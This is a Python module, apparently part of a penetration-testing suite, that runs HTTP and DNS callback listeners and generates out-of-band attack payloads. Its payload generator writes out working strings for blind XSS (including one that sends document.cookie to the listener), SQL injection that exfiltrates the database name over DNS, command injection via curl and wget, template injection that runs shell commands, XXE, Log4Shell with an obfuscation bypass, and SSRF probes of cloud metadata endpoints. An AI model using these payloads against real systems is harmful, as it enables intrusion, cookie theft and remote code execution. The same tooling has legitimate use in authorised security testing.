"""
TeamCyberOps Suite v4 — OAST / Collaborator Server
Out-of-band Application Security Testing
Detects: Blind SSRF, Blind XSS, Blind CMDi, DNS exfil, HTTP callbacks
Pure Python — no external dependencies
"""
import socket, threading, time, json, hashlib, base64, re, os
from http.server import HTTPServer, BaseHTTPRequestHandler
from datetime import datetime
from pathlib import Path

BASE_DIR  = Path(__file__).parent.parent.parent
LOGS_DIR  = BASE_DIR / "logs"
LOGS_DIR.mkdir(exist_ok=True)
OAST_LOG  = LOGS_DIR / "oast_interactions.json"

_interactions = []
_lock         = threading.Lock()
_dns_server   = None
_http_server  = None
_running      = False


def _load_interactions():
    global _interactions
    try:
        if OAST_LOG.exists():
            with open(OAST_LOG) as f:
                _interactions = json.load(f)
    except Exception:
        _interactions = []


def _save_interactions():
    try:
        with open(OAST_LOG, 'w') as f:
            json.dump(_interactions, f, indent=2)
    except Exception:
        pass


def add_interaction(interaction_type: str, source_ip: str,
                    payload_id: str = "", data: str = "",
                    extra: dict = None):
    """Record an OAST interaction."""
    entry = {
        "id":         len(_interactions) + 1,
        "type":       interaction_type,   # dns / http / smtp
        "source_ip":  source_ip,
        "payload_id": payload_id,
        "data":       data[:2000],
        "timestamp":  datetime.now().isoformat(),
        "extra":      extra or {},
    }
    with _lock:
        _interactions.append(entry)
        _save_interactions()
    return entry


def get_interactions(payload_id: str = None, since_id: int = 0) -> list:
    """Return interactions, optionally filtered by payload_id."""
    with _lock:
        results = _interactions[since_id:]
    if payload_id:
        results = [i for i in results if payload_id in i.get("payload_id","")]
    return results


def clear_interactions():
    global _interactions
    with _lock:
        _interactions = []
        _save_interactions()


def generate_payload_id(prefix: str = "tcop") -> str:
    """Generate unique payload ID for tracking."""
    uid = hashlib.md5(f"{prefix}{time.time()}".encode()).hexdigest()[:8]
    return f"{prefix}-{uid}"


# ══════════════════════════════════════════════════════════════
#  HTTP LISTENER
# ══════════════════════════════════════════════════════════════

class OASTHTTPHandler(BaseHTTPRequestHandler):
    def log_message(self, fmt, *args):
        pass  # suppress default logs

    def _handle(self):
        path      = self.path
        client    = self.client_address[0]
        method    = self.command
        headers   = dict(self.headers)
        body      = ""
        if self.headers.get("Content-Length"):
            try:
                length = int(self.headers["Content-Length"])
                body   = self.rfile.read(length).decode("utf-8", errors="replace")
            except Exception:
                pass

        # Extract payload ID from path or headers
        pid_match = re.search(r'[a-z]+-[0-9a-f]{8}', path)
        pid       = pid_match.group(0) if pid_match else ""

        add_interaction(
            "http", client, pid,
            data=f"{method} {path}",
            extra={"headers": {k: v for k, v in headers.items()
                                if k.lower() not in ('host',)},
                   "body": body[:500]}
        )

        # Respond with tracking pixel
        self.send_response(200)
        self.send_header("Content-Type", "image/gif")
        self.end_headers()
        # 1x1 transparent GIF
        self.wfile.write(base64.b64decode(
            "R0lGODlhAQABAIAAAAAAAP///yH5BAEAAAAALAAAAAABAAEAAAIBRAA7"))

    do_GET  = _handle
    do_POST = _handle
    do_PUT  = _handle
    do_HEAD = _handle
    do_OPTIONS = _handle


def start_http_listener(host: str = "0.0.0.0", port: int = 8877,
                         log_cb=None) -> dict:
    """Start OAST HTTP listener."""
    global _http_server, _running
    try:
        server = HTTPServer((host, port), OASTHTTPHandler)
        _http_server = server
        t = threading.Thread(target=server.serve_forever, daemon=True)
        t.start()
        _running = True
        if log_cb:
            log_cb(f"[+] OAST HTTP listener: {host}:{port}", "ok")
        return {"ok": True, "host": host, "port": port}
    except Exception as e:
        return {"ok": False, "error": str(e)}


def stop_http_listener():
    global _http_server, _running
    if _http_server:
        _http_server.shutdown()
        _http_server = None
    _running = False


# ══════════════════════════════════════════════════════════════
#  DNS LISTENER (pure Python UDP)
# ══════════════════════════════════════════════════════════════

def _parse_dns_query(data: bytes) -> str:
    """Extract domain name from DNS query packet."""
    try:
        pos    = 12  # skip header
        labels = []
        while pos < len(data):
            length = data[pos]
            if length == 0: break
            if length & 0xC0 == 0xC0:  # pointer
                break
            pos += 1
            labels.append(data[pos:pos+length].decode("ascii", errors="replace"))
            pos += length
        return ".".join(labels)
    except Exception:
        return "unknown"


def _build_dns_response(query: bytes, domain: str) -> bytes:
    """Build minimal DNS response (NXDOMAIN)."""
    try:
        txid    = query[:2]
        flags   = b'\x81\x83'  # QR=1, AA=1, RCODE=NXDOMAIN
        counts  = b'\x00\x01\x00\x00\x00\x00\x00\x00'
        return txid + flags + counts + query[12:]
    except Exception:
        return b''


def start_dns_listener(host: str = "0.0.0.0", port: int = 5353,
                        log_cb=None) -> dict:
    """Start OAST DNS listener."""
    global _dns_server
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
        sock.bind((host, port))
        _dns_server = sock

        def _listen():
            while _running:
                try:
                    data, addr = sock.recvfrom(512)
                    domain = _parse_dns_query(data)
                    client = addr[0]
                    # Extract payload ID
                    pid_match = re.search(r'[a-z]+-[0-9a-f]{8}', domain)
                    pid = pid_match.group(0) if pid_match else ""
                    add_interaction("dns", client, pid,
                                    data=domain,
                                    extra={"query_bytes": len(data)})
                    # Send NXDOMAIN response
                    resp = _build_dns_response(data, domain)
                    if resp:
                        sock.sendto(resp, addr)
                except Exception:
                    pass

        t = threading.Thread(target=_listen, daemon=True)
        t.start()
        if log_cb:
            log_cb(f"[+] OAST DNS listener: {host}:{port}", "ok")
        return {"ok": True, "host": host, "port": port}
    except Exception as e:
        return {"ok": False, "error": str(e)}


# ══════════════════════════════════════════════════════════════
#  PAYLOAD GENERATORS
# ══════════════════════════════════════════════════════════════

def generate_payloads(oast_host: str, pid: str) -> dict:
    """Generate OAST payloads for all vuln types."""
    http_url = f"http://{oast_host}:8877/{pid}"
    dns_host = f"{pid}.{oast_host}"

    return {
        "ssrf": {
            "http":        http_url,
            "dns":         f"http://{dns_host}/",
            "aws_meta":    "http://169.254.169.254/latest/meta-data/",
            "gcp_meta":    "http://metadata.google.internal/computeMetadata/v1/",
            "azure_meta":  "http://169.254.169.254/metadata/instance?api-version=2021-02-01",
            "file":        f"file:///etc/passwd",
            "gopher":      f"gopher://{oast_host}:8877/_{pid}",
        },
        "blind_xss": {
            "script_src":  f'<script src="{http_url}/xss.js"></script>',
            "img_onerror": f'<img src=x onerror="fetch(\'{http_url}/x\')">',
            "svg":         f'<svg onload="new Image().src=\'{http_url}/svg\'">',
            "fetch":       f'<script>fetch("{http_url}/f")</script>',
            "xhttpxhr":    f'<script>var x=new XMLHttpRequest();x.open("GET","{http_url}/xhr");x.send()</script>',
            "cookie_steal": f'<script>document.location="{http_url}/c?c="+document.cookie</script>',
        },
        "blind_sqli": {
            "mysql_dns":   f"' AND (SELECT LOAD_FILE(CONCAT('\\\\\\\\{dns_host}\\\\',database(),'\\\\a')))-- -",
            "mssql_dns":   f"'; EXEC master..xp_dirtree '\\\\{dns_host}\\a'--",
            "postgres":    f"'; COPY (SELECT '') TO PROGRAM 'nslookup {dns_host}'--",
        },
        "blind_cmdi": {
            "curl":        f"curl {http_url}/cmd",
            "wget":        f"wget {http_url}/cmd",
            "nslookup":    f"nslookup {dns_host}",
            "ping":        f"ping -c1 {dns_host}",
            "backtick":    f"`curl {http_url}`",
            "dollar":      f"$(curl {http_url}/cmd)",
        },
        "xxe": {
            "basic":       f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "{http_url}/xxe">]><foo>&xxe;</foo>',
            "ssrf":        f'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://{oast_host}:8877/{pid}/xxe">]><foo>&xxe;</foo>',
        },
        "ssti": {
            "jinja2":      f'{{{{"".__class__.__mro__[1].__subclasses__()[354]("curl {http_url}",shell=True,stdout=-1).communicate()}}}}',
            "freemarker":  f'<#assign x="freemarker.template.utility.Execute"?new()>${{x("curl {http_url}")}}',
        },
        "log4shell": {
            "basic":       f'${{jndi:ldap://{oast_host}:1389/{pid}}}',
            "bypass1":     f'${{${{::-j}}${{::-n}}${{::-d}}${{::-i}}:ldap://{oast_host}:1389/{pid}}}',
            "dns":         f'${{jndi:dns://{dns_host}/{pid}}}',
        },
    }

_load_interactions()
